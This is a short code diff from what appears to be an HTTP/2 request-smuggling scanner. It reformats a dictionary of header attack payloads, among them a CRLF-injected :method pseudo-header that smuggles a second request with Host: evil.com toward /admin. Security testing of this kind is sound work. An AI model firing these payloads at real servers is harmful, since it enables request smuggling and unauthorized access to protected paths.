@@ -9,9 +9,7 @@ H2_PATHS = ["/", "/api/", "/admin/", "/login", "/api/v1/", "/graphql"]
 
 # ──────────── H2 HEADER ATTACKS ────────────
 H2_HEADER_ATTACKS = {
-    "PSEUDO_HEADER_INJECTION": {
-        ":method": "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin"
-    },
+    "PSEUDO_HEADER_INJECTION": {":method": "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin"},
     "HEADER_NAME_CRLF": {"X-Test\r\nHost: evil.com": "inject"},
     "TRANSFER_ENCODING_H2": {"transfer-encoding": "chunked"},
     "CONNECTION_HEADER_H2": {"connection": "keep-alive"},
